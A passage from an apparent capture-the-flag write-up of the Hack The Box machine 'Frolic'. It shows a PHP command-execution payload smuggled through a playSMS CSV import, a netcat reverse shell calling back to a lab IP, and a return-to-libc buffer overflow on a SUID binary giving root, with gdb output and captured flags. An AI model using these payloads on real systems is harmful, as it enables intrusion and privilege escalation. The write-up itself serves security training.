Reading the exploitation explains it‚Äôs the same. Uses csv file upload functionality to exploit</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>Code Execution using import.php

     We know import.php accept file and just read content
    not stored in server. But when we stored payload in our backdoor.csv
    and upload to phonebook. Its execute our payload and show on next page in field (in NAME,MOBILE,Email,Group COde,Tags) accordingly .

    In My case i stored my vulnerable code  in my backdoor.csv files's Name field .

    But There is one problem in execution. Its only execute in built function and variable which is used in application.

    That why the server not execute our payload directly. Now i Use "<span class="cp">&lt;?php $a=$_SERVER['HTTP_USER_AGENT']; system($a); ?&gt;</span>" in name field and change our user agent to any command which u want
to execute command. Bcz it not execute <span class="cp">&lt;?php system("id")?&gt;</span> directly .

Example of my backdoor.csv file content
----------------------MY FILE CONTENT------------------------------------
Name                                                                                            Mobile  Email   Group code      Tags
<span class="cp">&lt;?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="foothold">Foothold</h1>
<h2 id="shell-as-www-data">Shell as www-data</h2>
<ul>
  <li>Made a csv file with this content:
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Name,Mobile,Email,Group,code,Tags
<span class="cp">&lt;?php</span> <span class="nv">$t</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span><span class="nb">system</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span><span class="cp">?&gt;</span>,22,,,,			
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Go to Account -&gt; Phonebook -&gt; Import</li>
  <li>Intercept the request of upload, change User-Agent value to <code class="language-plaintext highlighter-rouge">id</code></li>
  <li>Send the request to see this output</li>
</ul>

<p><img src="/assets/img/Posts/Frolic/frolic-phonebook.png" alt="Phonebook" />
If you change the User-Agent to <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f</code>:
Shell received:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>rlwrap nc <span class="nt">-lnvp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.111 34956
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1213<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@frolic:~/html/playsms<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>And www-data can read user flag:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>www-data@frolic:/home<span class="nv">$ </span><span class="nb">cat</span> ./ayush/user.txt
2ab95909cf509f85a6f476b59a0c2fe0
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="privesc">Privesc</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>www-data@frolic:/home/ayush/.binary<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
/sbin/mount.cifs
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/bin/umount
/bin/su
/bin/ntfs-3g
/home/ayush/.binary/rop
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Checking functionality of rop, shows we can pass any message. It also tries to copy the input we passed with strcpy, which is vulnerable.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>/home/ayush/.binary/rop
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Usage: program &lt;message&gt;

<span class="nv">$ </span>strings /home/ayush/.binary/rop | <span class="nb">grep </span>strcpy
strcpy
strcpy@@GLIBC_2.0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Checking for ASLR gives 0 which means everything is static.</p>
<pre><code class="language-BASH">$ cat /proc/sys/kernel/randomize_va_space
0
</code></pre>
<p>I pulled the binary to my box as frolic didn‚Äôt have gdb installed.</p>

<h2 id="rop-return-oriented-programming">ROP (Return-Oriented Programming)</h2>
<p>Open <code class="language-plaintext highlighter-rouge">rop</code> in gdb with <a href="https://github.com/longld/peda">PEDA</a>, and run checksec:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gdb <span class="nt">-q</span> ./rop
Reading symbols from ./rop...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./rop<span class="o">)</span>
gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So, DEP(NX) is enabled, which means stack is Non-Executable or I can‚Äôt run shellcode from the stack, which is where I can write.
Easiest attack I can do is Return-to-libc. Return-to-libc attack is part of a concept called Return-Oriented Programming which basically utilizes code that is already present in the program.</p>

<p>Note: Writeup to understand in depth, how stack works? or what‚Äôs Return-to-libc: <a href="https://0xcaretaker.github.io/posts/October/#beyond-root">October-Beyond-Root</a></p>

<h2 id="return-to-libc">Return-to-libc</h2>
<p><img src="/assets/img/Posts/Frolic/frolic-ret2libc.png" alt="ret2libc" /></p>
<h3 id="finding-offset">Finding offset</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 200
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>
gdb-peda<span class="nv">$ </span>run <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>200 chars crashes the program and gives segmentation-fault:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>run <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>
Starting program: /root/HTB/Frolic/privesc/rop <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0xdd
EBX: 0xffffd0e0 <span class="o">(</span><span class="s2">"A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
ECX: 0x0
EDX: 0xc3
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x31414162 <span class="o">(</span><span class="s1">'bAA1'</span><span class="o">)</span>
ESP: 0xffffd0b0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
EIP: 0x41474141 <span class="o">(</span><span class="s1">'AAGA'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41474141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd0b0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0004| 0xffffd0b4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0008| 0xffffd0b8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0012| 0xffffd0bc <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0016| 0xffffd0c0 <span class="o">(</span><span class="s2">"IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0020| 0xffffd0c4 <span class="o">(</span><span class="s2">"AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0024| 0xffffd0c8 <span class="o">(</span><span class="s2">"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0028| 0xffffd0cc <span class="o">(</span><span class="s2">"fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 <span class="k">in</span> ?? <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Passing the value at EIP to pattern search:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern search <span class="s1">'AAGA'</span>
Registers contain pattern buffer:
EBP+0 found at offset: 48
EIP+0 found at offset: 52
Registers point to pattern buffer:
<span class="o">[</span>EBX] <span class="nt">--</span><span class="o">&gt;</span> offset 104 - size ~96
<span class="o">[</span>ESP] <span class="nt">--</span><span class="o">&gt;</span> offset 56 - size ~144
Pattern buffer found at:
0x0804b1cc : offset    5 - size  195 <span class="o">([</span>heap]<span class="o">)</span>
0xffffd078 : offset    0 - size  200 <span class="o">(</span><span class="nv">$sp</span> + <span class="nt">-0x38</span> <span class="o">[</span><span class="nt">-14</span> dwords]<span class="o">)</span>
0xffffd33e : offset    0 - size  200 <span class="o">(</span><span class="nv">$sp</span> + 0x28e <span class="o">[</span>163 dwords]<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>EIP+0 found at offset 52.</p>

<h3 id="confirming-the-offset">Confirming the offset</h3>
<p>Generating a Junk of 52 A‚Äôs and 4 B‚Äôs to reflect at EIP.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'print("A" * 52 + "BBBB")'</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
</pre></td></tr></tbody></table></code></pre></div></div>
<p>and it does reflects at EIP:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>run <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'</span>
Starting program: /root/HTB/Frolic/privesc/rop <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB'</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
EBX: 0xffffd170 <span class="nt">--</span><span class="o">&gt;</span> 0x2
ECX: 0x0
EDX: 0x0
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
ESP: 0xffffd140 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd300 <span class="nt">--</span><span class="o">&gt;</span> 0x10
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd140 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd300 <span class="nt">--</span><span class="o">&gt;</span> 0x10
0004| 0xffffd144 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd214 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd3b1 <span class="o">(</span><span class="s2">"/root/HTB/Frolic/privesc/rop"</span><span class="o">)</span>
0008| 0xffffd148 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd220 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd407 <span class="o">(</span><span class="s2">"SHELL=/bin/bash"</span><span class="o">)</span>
0012| 0xffffd14c <span class="nt">--</span><span class="o">&gt;</span> 0x8048561 <span class="o">(</span>&lt;__libc_csu_init+33&gt;:   lea    eax,[ebx-0xf8]<span class="o">)</span>
0016| 0xffffd150 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd170 <span class="nt">--</span><span class="o">&gt;</span> 0x2
0020| 0xffffd154 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffd158 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0028| 0xffffd15c <span class="nt">--</span><span class="o">&gt;</span> 0xf7ddae46 <span class="o">(</span>&lt;__libc_start_main+262&gt;:       add    esp,0x10<span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Confirmed offset of <code class="language-plaintext highlighter-rouge">52</code>.</p>
<h3 id="getting-addresses">Getting Addresses</h3>
<p>Return-to-libc attack requires addresses of system, exit (Return address) and /bin/sh.
We‚Äôll take addresses from the libc shared library present on frolic.</p>

<ul>
  <li>Finding address of libc with <code class="language-plaintext highlighter-rouge">ldd</code>:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>www-data@frolic:/home/ayush/.binary<span class="nv">$ </span>ldd ./rop | <span class="nb">grep </span>libc
      libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e19000<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Getting offsets for system, exit and /bin/sh with <code class="language-plaintext highlighter-rouge">readelf</code>:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>www-data@frolic<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s1">'system@@'</span> <span class="nt">-e</span> <span class="s1">'exit@@'</span>
 141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 <span class="nb">exit</span>@@GLIBC_2.0
1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>www-data@frolic<span class="nv">$ </span>strings <span class="nt">-at</span> x /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s1">'/bin/sh'</span>
 15ba0b /bin/sh
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>and for this libc base the final addresses are:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nb">exit    </span>address <span class="o">=</span> libc address + <span class="nb">exit    </span>offset <span class="k">in </span>libc
              <span class="o">=</span> 0xb7e19000 + 0x0002e9d0
              <span class="o">=</span> 0xb7e479d0
system  address <span class="o">=</span> libc address + system  offset <span class="k">in </span>libc
              <span class="o">=</span> 0xb7e19000 + 0x0003ada0
              <span class="o">=</span> 0xb7e53da0
/bin/sh address <span class="o">=</span> libc address + /bin/sh offset <span class="k">in </span>libc
              <span class="o">=</span> 0xb7e19000 + 0x15ba0b
              <span class="o">=</span> 0xb7f74a0b
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>You can calculate the final address like this:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'print(hex(0xb7e19000 + 0x15ba0b))'</span>
0xb7f74a0b
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Buffer overflow goes: JUNK + SYSTEM (overwrite ret address) + EXIT (add next return address) + ‚Äú/bin/sh‚Äù (arguments).
That junk can be just NOPS (No operations ~ <code class="language-plaintext highlighter-rouge">\x90</code>)</p>
    <h2 id="exploit">Exploit</h2>
    <p>Since ASLR isn‚Äôt enabled, we can do:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>www-data@frolic:/<span class="nv">$ </span>/home/ayush/.binary/rop <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7"'</span><span class="si">)</span><span class="p">;</span>
<span class="nb">whoami
</span>root
<span class="nb">cd</span> /root
<span class="nb">cat </span>root.txt
85d3fdf03f969892538ba9a731826222
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
</ul>
:ET